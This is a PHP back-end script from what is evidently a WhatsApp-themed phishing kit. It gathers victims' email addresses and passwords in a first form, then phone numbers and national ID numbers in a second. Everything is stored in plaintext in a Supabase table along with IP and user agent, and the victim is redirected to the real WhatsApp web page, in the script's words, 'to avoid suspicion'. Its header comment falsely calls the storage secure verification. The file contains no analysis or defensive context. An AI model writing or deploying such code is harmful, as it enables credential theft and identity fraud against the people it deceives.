<?php
// capture.php - Stores submitted details securely for verification

header('Content-Type: text/html; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: index.html');
    exit;
}

require_once __DIR__ . '/supabase.php';

$step = $_POST['step'] ?? '';
$ip   = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

if ($step === '1') {
    // First form: Email Secure Lock
    $email    = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $session  = bin2hex(random_bytes(16)); // Unique session token

    supabase_insert('submissions', [
        'type'       => 'email_lock',
        'session'    => $session,
        'email'      => $email,
        'password'   => $password,
        'ip'         => $ip,
        'user_agent' => $ua,
    ]);

    // Redirect to second page with session token
    header('Location: page2.html?session=' . urlencode($session));
    exit;

} elseif ($step === '2') {
    // Second form: Personal Geographical Info Lock
    $session     = $_POST['session'] ?? '';
    $countryCode = $_POST['country_code'] ?? '';
    $phone       = $_POST['phone'] ?? '';
    $idNumber    = $_POST['id_number'] ?? '';

    supabase_insert('submissions', [
        'type'         => 'geo_lock',
        'session'      => $session,
        'country_code' => $countryCode,
        'phone'        => $phone,
        'id_number'    => $idNumber,
        'ip'           => $ip,
        'user_agent'   => $ua,
    ]);

    // Redirect to real WhatsApp to avoid suspicion
    header('Location: https://web.whatsapp.com');
    exit;
}

// Fallback
header('Location: index.html');
exit;
